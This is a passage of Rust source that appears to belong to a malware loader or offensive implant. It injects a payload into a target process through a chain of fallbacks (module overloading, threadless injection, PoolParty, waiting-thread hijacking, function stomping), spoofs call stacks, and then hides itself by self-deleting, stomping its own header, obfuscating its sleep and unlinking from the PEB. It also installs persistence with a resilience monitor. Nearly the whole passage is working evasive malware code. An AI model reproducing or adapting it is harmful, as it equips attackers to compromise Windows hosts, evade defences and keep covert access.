            fn inject_overload(payload: &[u8], dll: &str) -> Result<()> {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                let m = crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string())
                    .map_err(|e| anyhow!("Module::new: {:?}", e))?;
                m.run().map_err(|e| anyhow!("Module::run: {:?}", e))?;
                Ok(())
            }
            inject_overload(&payload, dll)
        };

        if let Err(e) = result {
            cleanup_handles(h_target_proc, h_target_thread);
            return Err(e);
        }
        } // end else (non-reflective PE)
    } else {
        let mut injected = false;

        if cfg.use_threadless {
            if let Some(pid) = effective_pid {
                #[inline(never)]
                fn threadless(pid: u32, sc: &[u8]) -> bool {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    unsafe { inject_threadless_remote(pid, sc) }
                }
                injected = threadless(pid, &payload);
            }
        }

        if !injected {
            if let Some(pid) = effective_pid {
                #[inline(never)]
                fn pool_party(pid: u32, sc: &[u8]) -> bool {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    crate::pool_party::pool_party_inject(pid, sc).is_ok()
                }
                injected = pool_party(pid, &payload);
            }
        }

        // WaitingThread: enhanced (WAIT-state-aware) or legacy
        if !injected {
            if let Some(pid) = effective_pid {
                let wt_result = if cfg.waiting_thread {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    unsafe { crate::waiting_thread::inject(pid, &payload) }
                } else {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    unsafe { waiting_thread_inject(pid, &payload) }
                };
                if let Err(e) = wt_result {
                    cleanup_handles(h_target_proc, h_target_thread);
                    return Err(e);
                }
                injected = true;
            }
        }

        if !injected {
            #[inline(never)]
            fn stomp(sc: &[u8], dll: &str, exp: &str) -> Result<()> {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                unsafe {
                    crate::func_stomp::stomp_execute_restore(dll, exp, sc)
                        .with_context(|| format!("func_stomp {}!{}", dll, exp))?;
                }
                Ok(())
            }
            if let Err(e) = stomp(&payload, &cfg.stomp_dll, &cfg.stomp_export) {
                cleanup_handles(h_target_proc, h_target_thread);
                return Err(e);
            }
        }
    }

    // Resume target thread
    if let Some(ht) = h_target_thread {
        unsafe {
            let mut prev: u32 = 0;
            let _ = crate::recycled::nt_resume_thread(ht, &mut prev);
            crate::recycled::nt_close(ht);
        }
    }
    if let Some(hp) = h_target_proc {
        unsafe { crate::recycled::nt_close(hp); }
    }

    // ═══ FASE 5: CLEANUP ═════════════════════════════════════════
    crate::crypto::secure_zero_memory(&mut payload);
    drop(payload);

    if cfg.self_delete   { let _ = crate::self_delete::delete_self(); }

    if cfg.block_handle {
        if let Some(pid) = effective_pid {
            unsafe {
                // NtOpenProcess via RecycledGate (no Win32 OpenProcess)
                let mut hp: usize = 0;
                let mut cid = [pid as usize, 0usize];
                let mut oa: [usize; 6] = std::mem::zeroed();
                oa[0] = std::mem::size_of::<[usize; 6]>();
                let st = crate::recycled::nt_open_process(
                    &mut hp, 0x7A,
                    oa.as_mut_ptr() as *mut std::ffi::c_void,
                    cid.as_mut_ptr() as *mut std::ffi::c_void,
                );
                if st == 0 && hp != 0 {
                    let _ = crate::block_handle::block_external_handles(hp);
                    crate::recycled::nt_close(hp);
                }
            }
        }
    }

    if cfg.stomp_own_header {
        unsafe {
            let own = get_own_image_base();
            if !own.is_null() { let _ = crate::stomp::stomp_mapped_region(own); }
        }
    }

    if cfg.sleep_ms > 0  { crate::sleep::ekko_sleep_dynamic(cfg.sleep_ms); }
    if cfg.peb_unlink    { let _ = crate::peb_unlink::unlink_self(); }

    // ═══ FASE 6: PERSISTENCIA ════════════════════════════════════
    if cfg.persist {
        let persist_cfg = cfg.persist_cfg.unwrap_or_default();
        let _ = crate::persist::install_all(&persist_cfg);
        crate::persist::start_resilience_monitor(persist_cfg);
    }

    Ok(())
}

/// Backward-compat alias.
/// 
/// NOTE (Bug 17): If `embedded` points to static data (e.g. via include_bytes!), 
/// secure_zero_memory only clears the heap copy. The original data remains
/// in the .rodata section.
pub fn run_with_embedded(cfg: ChainConfig, embedded: &[u8]) -> anyhow::Result<()> {
    run_with_shellcode(cfg, embedded.to_vec())
}

fn inject_inline(cfg: &ChainConfig, payload: &[u8]) -> anyhow::Result<()> {
    use anyhow::Context;
    let is_pe = payload.len() > 2 && payload[0] == 0x4D && payload[1] == 0x5A;
    if is_pe {
        let dll = cfg.overload_target_dll.as_deref()
            .unwrap_or(r"C:\Windows\System32\version.dll");
        let m = crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string())
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;
        m.run().map_err(|e| anyhow::anyhow!("{:?}", e))?;
    } else {
        unsafe {
            crate::func_stomp::stomp_execute_restore(&cfg.stomp_dll, &cfg.stomp_export, payload)
                .with_context(|| format!("stomp {}!{}", cfg.stomp_dll, cfg.stomp_export))?;
        }
    }
    Ok(())
}

```